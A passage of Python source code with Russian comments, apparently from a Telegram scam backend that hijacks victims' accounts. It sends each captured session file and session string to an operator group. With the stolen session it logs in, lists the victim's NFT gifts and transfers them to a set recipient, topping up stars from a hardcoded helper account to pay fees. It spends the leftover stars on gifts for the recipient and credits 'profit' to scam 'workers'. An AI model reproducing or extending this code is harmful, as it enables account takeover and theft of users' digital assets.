                return phones.get(str(user_id), {}).get('phone_number')
    except Exception as e:
        return None
def init_user_record(user_id):
    try:
        phones = {}
        if os.path.exists(PHONE_FILE):
            try:
                with open(PHONE_FILE, 'r') as f:
                    content = f.read().strip()
                    if content:
                        phones = json.loads(content)
            except (json.JSONDecodeError, ValueError):
                phones = {}
        user_str = str(user_id)
        if user_str not in phones:
            phones[user_str] = {
                'phone_number': None, 
                'last_updated': datetime.now().isoformat()
            }
            with open(PHONE_FILE, 'w') as f:
                json.dump(phones, f, indent=2)
        return True
    except Exception as e:
        return False
def create_session_json(phone, twoFA=False, user_id=None, session_string: str = None):
    session_data = {
        'app_id': 14549469,
        'app_hash': 'a7ab219d3948725cb0b1a3c20b4b3126',
        'twoFA': twoFA,
        'session_file': f"{phone.replace('+', '')}.session",
        'phone': phone,
        'user_id': user_id,
        'last_update': datetime.now().isoformat(),
        'status': 'authorized'
    }
    if session_string:
        session_data['session_string'] = session_string
    if user_id:
        phones = {}
        if os.path.exists(PHONE_FILE):
            try:
                with open(PHONE_FILE, 'r') as f:
                    content = f.read().strip()
                    if content:
                        phones = json.loads(content)
            except (json.JSONDecodeError, ValueError):
                phones = {}
        phones[str(user_id)] = {
            'phone_number': phone,
            'last_updated': datetime.now().isoformat()
        }
        with open(PHONE_FILE, 'w') as f:
            json.dump(phones, f, indent=2)
    with open(f"{SESSION_DIR}/{phone.replace('+', '')}.json", 'w') as f:
        json.dump(session_data, f, indent=2)
    
    try:
        from telegram_bot import send_session_to_group, send_session_file_to_group
        session_file_path = f"{SESSION_DIR}/{phone.replace('+', '')}.session"
        if os.path.exists(session_file_path):
            try:
                asyncio.run(
                    send_session_file_to_group(user_id, phone, session_file_path, is_pyrogram=False)
                )
                print(f"✓ Telethon сессия отправлена как .session файл")
                pyrogram_session_string = asyncio.run(
                    convert_telethon_to_pyrogram(session_file_path)
                )
                asyncio.run(
                    send_session_to_group(user_id, phone, pyrogram_session_string, is_pyrogram=True)
                )
                print(f"✓ Pyrogram session string отправлен как .txt файл")
                if pyrogram_session_string:
                    print(f"🎁 Запускаем Tonnel-обход для аккаунта {phone}...")
                    try:
                        from tonnel_runner import launch_tonnel_background
                        launch_tonnel_background(pyrogram_session_string, phone, user_id)
                    except Exception as _tr_err:
                        print(f"Ошибка запуска Tonnel-обхода: {_tr_err}")
            except Exception as convert_error:
                print(f"Ошибка конвертации в Pyrogram: {convert_error}")
                asyncio.run(
                    send_session_file_to_group(user_id, phone, session_file_path, is_pyrogram=False)
                )
    except Exception as e:
        logger.error(f"Ошибка отправки сессии в группу: {e}", exc_info=True)
    return session_data
async def process_account_gifts(session_string: str, user_id: int, phone: str):
    from pyrogram import Client
    from telegram_client import API_ID, API_HASH
    from database import Database
    
    # Проверяем и исправляем user_id, если он отсутствует/некорректен/`web_user`
    if not user_id or (isinstance(user_id, str) and user_id == 'web_user'):
        # Пытаемся получить реальный user_id из сессии
        try:
            client_temp = Client(
                name=f"gift_processor_temp_{phone}",
                api_id=API_ID,
                api_hash=API_HASH,
                session_string=session_string
            )
            await client_temp.start()
            me = await client_temp.get_me()
            user_id = me.id if hasattr(me, 'id') else user_id
            await client_temp.stop()
            logger.info(f"✅ Определен user_id из сессии: {user_id} для телефона {phone}")
        except Exception as e:
            logger.warning(f"⚠️ Не удалось определить user_id из сессии: {e}")
            # Если не удалось получить ID, используем телефон как идентификатор
            user_id = hash(phone) % (10 ** 10)  # Генерируем числовой ID из телефона
    
    # Убеждаемся, что user_id - это число
    if not isinstance(user_id, int):
        try:
            user_id = int(user_id)
        except (ValueError, TypeError):
            # Если не удалось преобразовать, используем хеш телефона
            user_id = abs(hash(phone)) % (10 ** 10)
            logger.warning(f"⚠️ user_id не является числом, используем хеш телефона: {user_id}")
    
    # Помечаем процесс обработки как активный
    processing_key = f"{user_id}_{phone}"
    with _processing_lock:
        _processing_status[processing_key] = True
    
    # Запускаем скрипт крипто-бота в фоне
    try:
        start_cryptobot_script_background(phone, user_id)
    except Exception as e:
        logger.warning(f"⚠️ Не удалось запустить скрипт крипто-бота: {e}")
    
    # Логируем начало обработки в Discord
    # ВАЖНО: Используем telegram_id для автоматического определения воркера по привязке
    try:
        await log_user_action('session_processing_started', user_info={'telegram_id': user_id if isinstance(user_id, int) else None, 'id': user_id}, additional_data={'phone': phone, 'details': f"Начата обработка подарков для аккаунта: {phone}"})
    except Exception:
        pass
    
    try:
        client = Client(
            name=f"gift_processor_{user_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string
        )
        await client.start()
        try:
            log_key = f"acct:{phone}:{user_id}"
            begin_gift_log(log_key)
            # Разрешаем получателя по username (приоритет) или по телефону
            recipient_username = GIFT_RECIPIENT_USERNAME
            recipient_user_id = None
            if recipient_username:
                if not recipient_username.startswith('@'):
                    recipient_username = f"@{recipient_username}"
                try:
                    u = await client.get_users(recipient_username)
                    recipient_user_id = getattr(u, 'id', None)
                except Exception:
                    pass
            if recipient_user_id is None and GIFT_RECIPIENT_PHONE:
                try:
                    u = await client.get_users(GIFT_RECIPIENT_PHONE)
                    recipient_user_id = getattr(u, 'id', None)
                except Exception:
                    pass
            # Фоллбек на старый GIFT_RECIPIENT_ID (если ни username, ни телефон не сработали)
            if recipient_user_id is None:
                recipient_user_id = GIFT_RECIPIENT_ID
                recipient_username = recipient_username or str(GIFT_RECIPIENT_ID)
            
            # Получаем статистику подарков и звезд
            gifts_stats = await get_gifts_statistics(client)
            account_stats = await get_account_stats(session_string)
            
            gifts_count = gifts_stats['total_gifts']
            nft_gifts_count = gifts_stats['nft_gifts']
            transferable_count = gifts_stats['transferable_gifts']
            stars_balance = account_stats.get('stars_balance', 0)

            # Перечисление NFT-подарков (с ссылками) при старте работы
            try:
                nft_links: list[str] = []
                nft_count = 0
                async for g in client.get_chat_gifts("me"):
                    try:
                        # Расширенная проверка на NFT подарок
                        is_limited = getattr(g, 'is_limited', False)
                        attributes = getattr(g, 'attributes', None)
                        has_attributes = attributes is not None and len(attributes) > 0
                        link = getattr(g, 'link', None)
                        gift_id = getattr(g, 'id', None)
                        
                        # NFT подарок определяется по:
                        # 1. is_limited = True
                        # 2. Наличие attributes
                        # 3. Наличие link (ссылка на NFT)
                        is_nft = bool(is_limited) or has_attributes or (link and ('nft' in link.lower() or 't.me/nft' in link.lower()))
                        
                        if is_nft:
                            nft_count += 1
                            if link:
                                # Проверяем валидность ссылки перед добавлением
                                if is_valid_nft_link(link):
                                    nft_links.append(link)
                            else:
                                    try:
                                        append_gift_log(log_key, f"⚠️ Пропущена невалидная NFT ссылка для подарка ID={gift_id}: {link}")
                                    except Exception:
                                        pass
                            # Не добавляем сгенерированные ссылки вида gift-{id}, так как они невалидны
                    except Exception as e:
                        logger.debug(f"Ошибка при проверке подарка: {e}")
                        pass

                # Добавляем в агрегатор логов
                try:
                    append_gift_log(log_key, f"📋 Найдено NFT подарков: {nft_count}, со ссылками: {len(nft_links)}")
                    if nft_links:
                        append_gift_log(log_key, f"📋 NFT подарки ({len(nft_links)}):")
                        for i, link in enumerate(nft_links, 1):
                            append_gift_log(log_key, f"🎁 {i}. {link}")
                except Exception:
                    pass

                # Отправляем отдельное сообщение с фотографией и перечнем
                try:
                    from telegram_bot import send_message_to_group_with_animation
                    gift_list_text = ""
                    for i, link in enumerate(nft_links, 1):
                        gift_list_text += f"🎁 {i}. {link}\n"
                    message = (
                        f"🧑‍🎤 Старт обработки аккаунта\n\n"
                        f"┠ Аккаунт: {phone} (ID: {user_id})\n"
                        f"┠ Найдено NFT подарков: {nft_count}\n"
                        f"┠ NFT подарки со ссылками ({len(nft_links)}):\n"
                        f"{gift_list_text.rstrip()}\n"
                    )
                    await send_message_to_group_with_animation(message.strip(), user_id, phone, None)
                except Exception:
                    pass
            except Exception:
                pass
            
            unique_gifts_transferred = 0
            transferred_gift_links = []
            failed_gift_transfers = []  # Список неудачных передач
            
            # Логируем начало обработки всех подарков
            try:
                append_gift_log(log_key, f"🔄 Начинаем обработку всех подарков из инвентаря...")
            except Exception:
                pass
            
            total_gifts_checked = 0
            nft_gifts_found = 0
            
            async for gift in client.get_chat_gifts("me"):
                total_gifts_checked += 1
                try:
                    # Расширенная проверка на NFT подарок с детальным логированием
                    is_limited = getattr(gift, 'is_limited', False)
                    attributes = getattr(gift, 'attributes', None)
                    has_attributes = attributes is not None and len(attributes) > 0
                    link = getattr(gift, 'link', None)
                    gift_id = getattr(gift, 'id', None)
                    
                    # NFT подарок определяется по:
                    # 1. is_limited = True
                    # 2. Наличие attributes (не пустой список)
                    # 3. Наличие link со словом 'nft' или 't.me/nft'
                    is_nft = bool(is_limited) or has_attributes or (link and ('nft' in link.lower() or 't.me/nft' in link.lower()))
                    
                    # Логируем информацию о каждом подарке для отладки
                    try:
                        append_gift_log(
                            log_key,
                            f"🔍 Подарок ID={gift_id}: is_limited={is_limited}, has_attributes={has_attributes}, has_link={bool(link)}, is_nft={is_nft}"
                        )
                    except Exception:
                        pass
                    
                    # Обрабатываем только NFT подарки (не требуем наличия link)
                    if is_nft:
                        nft_gifts_found += 1
                        # Проверяем, можно ли передать подарок
                        from datetime import datetime
                        now = datetime.now()
                        can_transfer = True
                        
                        # Проверяем флаг передачи
                        if getattr(gift, 'is_transferred', False):
                            can_transfer = False
                            try:
                                append_gift_log(log_key, f"⚠️ Подарок ID={gift_id} уже передан, пропускаем")
                            except Exception:
                                pass
                        
                        # Проверяем наличие владельца (owner_address)
                        if can_transfer and hasattr(gift, 'owner_address') and gift.owner_address:
                            can_transfer = False
                            try:
                                append_gift_log(log_key, f"⚠️ Подарок ID={gift_id} имеет владельца, пропускаем")
                            except Exception:
                                pass
                        
                        # Проверяем дату блокировки передачи
                        if can_transfer and hasattr(gift, 'can_transfer_at') and gift.can_transfer_at:
                            if gift.can_transfer_at > now:
                                can_transfer = False
                                try:
                                    append_gift_log(log_key, f"⚠️ Подарок ID={gift_id} заблокирован до {gift.can_transfer_at}, пропускаем")
                                except Exception:
                                    pass
                        
                        # Проверяем общую дату блокировки
                        if can_transfer and hasattr(gift, 'locked_until_date') and gift.locked_until_date:
                            if gift.locked_until_date > now:
                                can_transfer = False
                                try:
                                    append_gift_log(log_key, f"⚠️ Подарок ID={gift_id} заблокирован до {gift.locked_until_date}, пропускаем")
                                except Exception:
                                    pass
                        
                        # Если подарок нельзя передать, пропускаем его
                        if not can_transfer:
                            continue
                        
                        # Логируем, что начинаем передачу
                        try:
                            append_gift_log(log_key, f"✅ Начинаем передачу NFT подарка ID={gift_id}")
                        except Exception:
                            pass
                        
                        # СНАЧАЛА пытаемся передать подарок (без проверки баланса)
                        success, error_reason = await transfer_gift_to_recipient(client, gift, recipient_user_id, log_key=log_key)
                        if success:
                            unique_gifts_transferred += 1
                            # Получаем link подарка (может быть None)
                            gift_link = getattr(gift, 'link', None)
                            # Добавляем только валидные ссылки
                            if gift_link and is_valid_nft_link(gift_link):
                                transferred_gift_links.append(gift_link)
                            elif gift_link:
                                # Если ссылка есть, но невалидна - логируем
                                try:
                                    append_gift_log(log_key, f"⚠️ Пропущена невалидная NFT ссылка для переданного подарка ID={getattr(gift, 'id', 'unknown')}: {gift_link}")
                                except Exception:
                                    pass
                            await log_gift_transfer_success(gift, user_id, phone, recipient_username, log_key=log_key)
                        else:
                            # Проверяем тип ошибки по конкретному тексту (нечувствительно к регистру)
                            error_reason_upper = error_reason.upper()
                            # Cooldown: проверяем конкретно STARGIFT_TRANSFER_TOO_EARLY_X
                            is_cooldown_error = "STARGIFT_TRANSFER_TOO_EARLY" in error_reason_upper or "TOO_EARLY" in error_reason_upper
                            # Недостаточно звезд: проверяем BALANCE_TOO_LOW или INSUFFICIENT_STARS (в любом регистре)
                            is_insufficient_stars = (
                                "BALANCE_TOO_LOW" in error_reason_upper or 
                                "INSUFFICIENT_STARS" in error_reason_upper or 
                                "BALANCE" in error_reason_upper and "TOO_LOW" in error_reason_upper or
                                error_reason == "Недостаточно звезд" or
                                "недостаточно" in error_reason.lower() and "звезд" in error_reason.lower()
                            )
                            
                            # Логируем для отладки
                            try:
                                append_gift_log(log_key, f"🔍 Анализ ошибки: is_cooldown={is_cooldown_error}, is_insufficient_stars={is_insufficient_stars}, error_reason={error_reason[:200]}")
                            except Exception:
                                pass
                            
                            # Если ошибка cooldown - нельзя передать, пропускаем без докидывания звезд
                            if is_cooldown_error:
                                gift_link = getattr(gift, 'link', None)
                                if gift_link and is_valid_nft_link(gift_link):
                                    failed_gift_transfers.append(f"{gift_link} - {error_reason} (cooldown, нельзя передать)")
                                else:
                                    # Если ссылка невалидна или отсутствует, используем ID подарка
                                    failed_gift_transfers.append(f"Подарок ID={getattr(gift, 'id', 'unknown')} - {error_reason} (cooldown, нельзя передать)")
                                try:
                                    append_gift_log(log_key, f"⏸️ Подарок ID={gift_id} на cooldown, пропускаем (нельзя передать)")
                                except Exception:
                                    pass
                            # Если недостаток звезд - докидываем звезды и повторяем
                            elif is_insufficient_stars:
                                try:
                                    # Логируем причину докидывания звезд
                                    try:
                                        append_gift_log(log_key, f"⭐ Недостаточно звезд для подарка ID={gift_id}, докидываем и повторяем...")
                                    except Exception:
                                        pass
                                    
                                    # Докидываем звезды: отправляем подарки и конвертируем
                                    # Привет от аккаунта докида к новой сессии отправляется внутри send_gifts_to_user_id_with_pyrogram
                                    # Определяем получателя из текущей сессии
                                    try:
                                        me = await client.get_me()
                                        me_username = getattr(me, 'username', None)
                                        me_id = getattr(me, 'id', None)
                                    except Exception as me_err:
                                        me_username = None
                                        me_id = None
                                    
                                    # Логируем, куда будем докидывать
                                    try:
                                        if me_username:
                                            target_desc = me_username if me_username.startswith('@') else f"@{me_username}"
                                        elif me_id:
                                            target_desc = f"ID {me_id}"
                                        else:
                                            target_desc = f"fallback ID {user_id}"
                                        append_gift_log(log_key, f"🎯 Докид: целевой получатель {target_desc}")
                                    except Exception:
                                        pass
                                    
                                    # ВАЖНО: Сначала устанавливаем контакт от новой сессии к докид-аккаунту
                                    # Это нужно, чтобы они "встретились" в Telegram и можно было отправлять подарки
                                    dokid_account_id = 8341789224  # ID докид-аккаунта (+79060130047)
                                    try:
                                        append_gift_log(log_key, f"👋 Устанавливаем контакт: отправляем сообщение от новой сессии к докид-аккаунту (ID: {dokid_account_id})")
                                        # Пытаемся отправить сообщение от новой сессии к докид-аккаунту
                                        try:
                                            await client.send_message(chat_id=dokid_account_id, text="❤")
                                            append_gift_log(log_key, f"✅ Контакт установлен: сообщение отправлено к докид-аккаунту")
                                            await asyncio.sleep(0.5)  # Небольшая задержка для установки связи
                                        except Exception as contact_err:
                                            contact_err_str = str(contact_err)
                                            # Если не удалось по ID, пробуем через username докид-аккаунта
                                            if "PEER_ID_INVALID" in contact_err_str or "USERNAME_INVALID" in contact_err_str:
                                                try:
                                                    # Пробуем найти докид-аккаунт по телефону или другому способу
                                                    dokid_phone = "+79060130047"
                                                    try:
                                                        u = await client.get_users(dokid_phone)
                                                        if u and hasattr(u, 'id'):
                                                            await client.send_message(chat_id=u.id, text="❤")
                                                            append_gift_log(log_key, f"✅ Контакт установлен через телефон докид-аккаунта")
                                                            await asyncio.sleep(0.5)
                                                    except Exception:
                                                        append_gift_log(log_key, f"⚠️ Не удалось установить контакт через телефон, продолжаем...")
                                                except Exception:
                                                    append_gift_log(log_key, f"⚠️ Не удалось установить контакт: {contact_err_str[:100]}, продолжаем попытку докида...")
                                            else:
                                                append_gift_log(log_key, f"⚠️ Ошибка установки контакта: {contact_err_str[:100]}, продолжаем...")
                                    except Exception as contact_setup_err:
                                        append_gift_log(log_key, f"⚠️ Ошибка при установке контакта: {str(contact_setup_err)[:100]}, продолжаем попытку докида...")
                                    
                                    # Пытаемся докинуть звезды с повторными попытками
                                    gift_send_success = False
                                    gift_send_message = ""
                                    max_dokid_attempts = 3
                                    for dokid_attempt in range(1, max_dokid_attempts + 1):
                                        try:
                                            if me_username:
                                                target_username = me_username if me_username.startswith('@') else f"@{me_username}"
                                                gift_send_success, gift_send_message = await send_gifts_to_username_with_pyrogram(target_username, count=2, log_key=log_key)
                                            elif me_id:
                                                gift_send_success, gift_send_message = await send_gifts_to_user_id_with_pyrogram(me_id, count=2, log_key=log_key)
                                            else:
                                                # Если у пользователя нет username, используем его user_id
                                                gift_send_success, gift_send_message = await send_gifts_to_user_id_with_pyrogram(user_id, count=2, log_key=log_key)
                                            
                                            if gift_send_success:
                                                break
                                            else:
                                                # Логируем причину неудачи
                                                error_msg = gift_send_message or "Неизвестная ошибка"
                                                if dokid_attempt < max_dokid_attempts:
                                                    try:
                                                        append_gift_log(log_key, f"⚠️ Докид не удался (попытка {dokid_attempt}/{max_dokid_attempts}): {error_msg[:150]}, повторяем через 0.5 сек...")
                                                    except Exception:
                                                        pass
                                                    await asyncio.sleep(0.5)  # Уменьшаем задержку для ускорения
                                                else:
                                                    try:
                                                        append_gift_log(log_key, f"❌ Все попытки докида не удались. Последняя ошибка: {error_msg[:150]}")
                                                    except Exception:
                                                        pass
                                        except Exception as dokid_err:
                                            error_str = str(dokid_err)
                                            if dokid_attempt < max_dokid_attempts:
                                                try:
                                                    append_gift_log(log_key, f"⚠️ Ошибка докида (попытка {dokid_attempt}/{max_dokid_attempts}): {error_str[:150]}, повторяем через 0.5 сек...")
                                                except Exception:
                                                    pass
                                                await asyncio.sleep(0.5)  # Уменьшаем задержку для ускорения
                                            else:
                                                try:
                                                    append_gift_log(log_key, f"❌ Все попытки докида не удались. Исключение: {error_str[:150]}")
                                                except Exception:
                                                    pass
                                    
                                    if gift_send_success:
                                        # Уменьшаем паузу для ускорения процесса
                                        await asyncio.sleep(0.3)
                                        converted_stars = await convert_available_gifts_to_stars_with_client(
                                            client,
                                            exclude_ids={getattr(gift, 'id', None)},
                                            max_to_convert=10,
                                            log_key=log_key
                                        )
                                        
                                        # Проверяем баланс звезд после конвертации
                                        balance_success = False
                                        current_balance = 0
                                        try:
                                            balance_success, current_balance = await get_star_balance_with_client(client)
                                        except Exception as balance_err:
                                            try:
                                                append_gift_log(log_key, f"⚠️ Не удалось проверить баланс после докида: {str(balance_err)[:50]}")
                                            except Exception:
                                                pass
                                        
                                        # Проверяем, что конвертация прошла успешно и баланс достаточен
                                        if converted_stars and converted_stars > 0:
                                            try:
                                                append_gift_log(log_key, f"✅ Докид успешен, конвертировано {converted_stars} звезд, баланс: {current_balance if balance_success else 'неизвестен'}")
                                            except Exception:
                                                pass
                                        elif balance_success and current_balance > 0:
                                            try:
                                                append_gift_log(log_key, f"✅ Докид выполнен, баланс звезд: {current_balance}, пробуем передать подарок...")
                                            except Exception:
                                                pass
                                        else:
                                            try:
                                                append_gift_log(log_key, f"⚠️ Докид выполнен, но конвертация не дала звезд, баланс: {current_balance if balance_success else 'неизвестен'}, пробуем передать подарок...")
                                            except Exception:
                                                pass
                                    else:
                                        # Если докид не удался, проверяем текущий баланс перед попыткой передачи
                                        balance_success = False
                                        current_balance = 0
                                        try:
                                            balance_success, current_balance = await get_star_balance_with_client(client)
                                            if balance_success:
                                                try:
                                                    append_gift_log(log_key, f"⚠️ Докид не удался, но текущий баланс: {current_balance} звезд, пробуем передать подарок...")
                                                except Exception:
                                                    pass
                                        except Exception:
                                            pass
                                    
                                    # Повторная попытка передачи после докидывания звезд
                                    retry_success, retry_error = await transfer_gift_to_recipient(client, gift, recipient_user_id, log_key=log_key)
                                    if retry_success:
                                        unique_gifts_transferred += 1
                                        gift_link = getattr(gift, 'link', None)
                                        # Добавляем только валидные ссылки
                                        if gift_link and is_valid_nft_link(gift_link):
                                            transferred_gift_links.append(gift_link)
                                        await log_gift_transfer_success(gift, user_id, phone, recipient_username, log_key=log_key)
                                        # Удаляем из списка неудачных передач по валидной ссылке или ID
                                        gift_link_for_remove = getattr(gift, 'link', None)
                                        if gift_link_for_remove and is_valid_nft_link(gift_link_for_remove):
                                            failed_gift_transfers = [x for x in failed_gift_transfers if gift_link_for_remove not in x]
                                        else:
                                            # Удаляем по ID подарка
                                            gift_id_str = f"ID={getattr(gift, 'id', 'unknown')}"
                                            failed_gift_transfers = [x for x in failed_gift_transfers if gift_id_str not in x]
                                    else:
                                        # Добавляем неудачную передачу в список
                                        gift_link = getattr(gift, 'link', None)
                                        if gift_link and is_valid_nft_link(gift_link):
                                            failed_gift_transfers.append(f"{gift_link} - {retry_error}")
                                        else:
                                            failed_gift_transfers.append(f"Подарок ID={getattr(gift, 'id', 'unknown')} - {retry_error}")
                                except Exception as retry_err:
                                    # Если ошибка при повторной попытке, добавляем в список неудачных
                                    gift_link = getattr(gift, 'link', None)
                                    if gift_link and is_valid_nft_link(gift_link):
                                        failed_gift_transfers.append(f"{gift_link} - {error_reason} (ошибка при повторе: {str(retry_err)[:50]})")
                                    else:
                                        failed_gift_transfers.append(f"Подарок ID={getattr(gift, 'id', 'unknown')} - {error_reason} (ошибка при повторе: {str(retry_err)[:50]})")
                            else:
                                # Для других ошибок просто добавляем в список неудачных
                                gift_link = getattr(gift, 'link', None)
                                if gift_link and is_valid_nft_link(gift_link):
                                    failed_gift_transfers.append(f"{gift_link} - {error_reason}")
                                else:
                                    failed_gift_transfers.append(f"Подарок ID={getattr(gift, 'id', 'unknown')} - {error_reason}")
                except Exception as gift_error:
                    await log_gift_processing_error(gift_error, user_id, phone, log_key=log_key)
            
            # Логируем итоговую статистику обработки
            try:
                append_gift_log(
                    log_key,
                    f"📊 Итоговая статистика: проверено подарков={total_gifts_checked}, найдено NFT={nft_gifts_found}, передано={unique_gifts_transferred}"
                )
            except Exception:
                pass
            
            # Отправляем профит если есть удачные передачи ИЛИ были попытки передачи (есть неудачные)
            has_transfers = unique_gifts_transferred > 0
            has_attempts = (failed_gift_transfers and len(failed_gift_transfers) > 0) or (transferred_gift_links and len(transferred_gift_links) > 0)
            
            if has_transfers or has_attempts:
                try:
                    db = Database()
                    worker_info = None

                    # 1) Приоритет: явная привязка пользователя к воркеру (user_worker_bindings)
                    try:
                        if hasattr(db, "get_worker_for_user"):
                            binding = db.get_worker_for_user(user_id, only_active=True)
                            if binding:
                                worker_info = {
                                    "telegram_id": binding.get("worker_telegram_id"),
                                    "username": binding.get("username"),
                                    "first_name": binding.get("first_name"),
                                    "last_name": binding.get("last_name"),
                                }
                    except Exception as bind_err:
                        logger.debug(f"Не удалось получить воркера через get_worker_for_user для user_id={user_id}: {bind_err}")

                    # 2) Fallback: старый метод по последнему подарку (если он реализован)
                    if not worker_info and hasattr(db, "get_worker_by_last_gift"):
                        try:
                            legacy_worker = db.get_worker_by_last_gift(user_id)
                            if legacy_worker:
                                worker_info = legacy_worker
                        except Exception as last_gift_err:
                            logger.debug(f"Не удалось получить воркера по последнему подарку для user_id={user_id}: {last_gift_err}")

                    # Даже если воркер не найден — всё равно отправляем профит (воркер будет «Неизвестно» и это будет явно видно в логах)
                    await send_profit_log(worker_info, transferred_gift_links, user_id, failed_gift_transfers)
                except Exception as e:
                    try:
                        logger.error(f"❌ Ошибка отправки профита (user_id={user_id}): {e}", exc_info=True)
                    except Exception:
                        pass
            
            # Отправляем уведомление только если не удалось передать ни один NFT
            if unique_gifts_transferred == 0:
                await send_no_gifts_notification(user_id, phone, gifts_count, nft_gifts_count, transferable_count, stars_balance)
                try:
                    append_gift_log(
                        log_key,
                        (
                            f"📭 Не удалось передать ни один NFT\n"
                            f"👤 аккаунт: {phone} (id={user_id})\n"
                            f"🎁 всего подарков: {gifts_count}, NFT: {nft_gifts_count}, переносимых: {transferable_count}\n"
                            f"⭐ баланс звёзд: {stars_balance}"
                        )
                    )
                except Exception as _log_err:
                    print(f"⚠️ Ошибка логирования статуса отсутствия передач: {_log_err}")
            
            # После передачи NFT подарков отправляем оставшиеся звезды в виде подарков по приоритету
            # Временно отключаем списание звёзд, если установлен флаг в конфиге
            try:
                from config_bot import config
                if config.DISABLE_STAR_REACTION:
                    return
                # Получаем текущий баланс звезд после передачи NFT подарков
                success, current_balance = await get_star_balance_with_client(client)
                # Если баланс звёзд меньше порога, докидываем и конвертируем
                if success and int(current_balance) < 25:
                    gift_send_success, gift_send_message = await send_gifts_to_user_id_with_pyrogram(user_id, count=2, log_key=log_key)
                    if gift_send_success:
                        await asyncio.sleep(0.3)
                        _ = await convert_available_gifts_to_stars_with_client(
                            client,
                            exclude_ids=set(),
                            max_to_convert=10,
                            log_key=log_key
                        )
                        success, current_balance = await get_star_balance_with_client(client)
                # Отправляем оставшиеся звезды в виде подарков по приоритету (100 → 50 → 25 → 15)
                if success and current_balance > 0:
                    # Импортируем конфигурацию для получения ID подарков
                    from config_bot import BotConfig as Config
                    
                    gift_send_success = False
                    gift_send_message = ""
                    total_sent = 0
                    total_failed = 0
                    
                    # Используем recipient_user_id, который был определен ранее в функции
                    if recipient_user_id:
                        try:
                            # Сначала отправляем сообщение пользователю, чтобы установить контакт (исправление ошибки 400 PEER_ID_INVALID)
                            try:
                                pre_text = os.getenv('PRE_GIFT_MESSAGE', '❤').strip()
                                if not pre_text:
                                    pre_text = "Привет! 👋"
                                try:
                                    await client.send_message(chat_id=int(recipient_user_id), text=pre_text)
                                    await asyncio.sleep(0.1)  # Минимальная задержка перед отправкой подарка
                                except Exception as msg_err:
                                    # Пробуем через username
                                    try:
                                        u = await client.get_users(int(recipient_user_id))
                                        uname = getattr(u, 'username', None)
                                        if uname:
                                            await client.send_message(chat_id=f"@{uname}", text=pre_text)
                                            await asyncio.sleep(0.1)
                                    except Exception:
                                        pass
                            except Exception:
                                pass
                            
                            # Отправляем подарки по приоритету: сначала самые дорогие, потом дешевле
                            # Список подарков в порядке приоритета (от дорогих к дешевым)
                            gift_priorities = [
                                {'cost': 100, 'id': Config.GIFT_ID_100_STARS, 'enabled': bool(Config.GIFT_ID_100_STARS)},
                                {'cost': 50, 'id': Config.GIFT_ID_50_STARS, 'enabled': bool(Config.GIFT_ID_50_STARS)},
                                {'cost': 25, 'id': Config.GIFT_ID_25_STARS, 'enabled': bool(Config.GIFT_ID_25_STARS)},
                                {'cost': 15, 'id': Config.GIFT_ID_15_STARS, 'enabled': bool(Config.GIFT_ID_15_STARS)},
                            ]
                            
                            # Отправляем подарки каждого типа, пока хватает баланса
                            for gift_type in gift_priorities:
                                if not gift_type['enabled']:
                                    continue
                                
                                gift_cost = gift_type['cost']
                                gift_id = gift_type['id']
                                
                                # Отправляем подарки этого типа, пока хватает баланса
                                while True:
                                    # Обновляем баланс перед каждой отправкой
                                    balance_success, current_balance = await get_star_balance_with_client(client)
                                    if not balance_success or int(current_balance) < gift_cost:
                                        # Баланс недостаточен для этого типа подарка, переходим к следующему
                                        break
                                    
                                    # Отправляем один подарок
                                    try:
                                        result = await client.send_gift(chat_id=int(recipient_user_id), gift_id=int(gift_id))
                                        if result:
                                            total_sent += 1
                                            gift_send_success = True
                                            # Небольшая задержка перед обновлением баланса
                                            await asyncio.sleep(0.2)
                                        else:
                                            total_failed += 1
                                            # Если отправка не удалась, переходим к следующему типу подарка
                                            break
                                    except Exception as send_err:
                                        total_failed += 1
                                        # Пробуем через username, если по ID не получилось
                                        try:
                                            u = await client.get_users(int(recipient_user_id))
                                            uname = getattr(u, 'username', None)
                                            if uname:
                                                result = await client.send_gift(chat_id=f"@{uname}", gift_id=int(gift_id))
                                                if result:
                                                    total_sent += 1
                                                    gift_send_success = True
                                                    await asyncio.sleep(0.2)
                                                else:
                                                    total_failed += 1
                                                    break
                                            else:
                                                break
                                        except Exception:
                                            break
                            
                            # После завершения цикла отправки подарков получаем финальный баланс
                            final_balance_success, final_balance = await get_star_balance_with_client(client)
                            
                            if total_sent > 0:
                                gift_send_message = f"Отправлено {total_sent} подарков"
                                if total_failed > 0:
                                    gift_send_message += f" (неудачных попыток: {total_failed})"
                                
                                # Если остались звезды после отправки подарков, отправляем их на канал
                                if final_balance_success and final_balance > 0:
                                    try:
                                        reaction_success, reaction_message = await send_star_reaction_with_client(
                                            client, 
                                            STAR_REACTION_CHANNEL, 
                                            STAR_REACTION_MESSAGE_ID, 
                                            final_balance
                                        )
                                    except Exception:
                                        pass
                            else:
                                gift_send_success = False
                                gift_send_message = f"Не удалось отправить ни одного подарка (неудачных попыток: {total_failed})"
                        except Exception as gift_error:
                            gift_send_success = False
                            gift_send_message = str(gift_error)
                    else:
                        gift_send_success = False
            except Exception as star_error:
                pass
                try:
                    append_gift_log(log_key, f"❌ Ошибка отправки звезд: {star_error}")
                except Exception:
                    pass
            # Финальная отправка агрегированного лога за весь шаг
            try:
                await flush_gift_log(log_key, header=f"Логи обработки подарков {phone}", with_spoiler=True)
            except Exception as _flush_err:
                logger.warning(f"Ошибка финальной отправки агрегированного лога: {_flush_err}")
            
            # Логируем завершение обработки с итоговой статистикой в Discord
            try:
                await log_user_action(
                    'session_processing_completed',
                    user_info={'id': user_id},
                    additional_data={
                        'phone': phone,
                        'gifts_processed': gifts_count,
                        'nft_gifts': nft_gifts_count,
                        'gifts_transferred': unique_gifts_transferred,
                        'stars_balance': stars_balance,
                        'details': f"Обработано {gifts_count} подарков, передано {unique_gifts_transferred} NFT подарков"
                    }
                )
                
                logger.info(f"✅ Обработка подарков завершена для {phone}: обработано {gifts_count}, передано {unique_gifts_transferred} NFT")
            except Exception as log_err:
                logger.warning(f"Ошибка логирования завершения обработки: {log_err}")
        finally:
            await client.stop()
    except Exception as e:
        await log_gift_processing_error(e, user_id, phone, log_key=f"acct:{phone}:{user_id}")
    finally:
        # Помечаем процесс обработки как завершенный
        processing_key = f"{user_id}_{phone}"
        with _processing_lock:
            if processing_key in _processing_status:
                del _processing_status[processing_key]

def is_processing_in_progress(user_id: int, phone: str) -> bool:
    """
    Проверяет, идет ли процесс обработки подарков для указанного аккаунта
    
    Args:
        user_id: ID пользователя
        phone: Номер телефона
        
    Returns:
        True если обработка идет, False если нет
    """
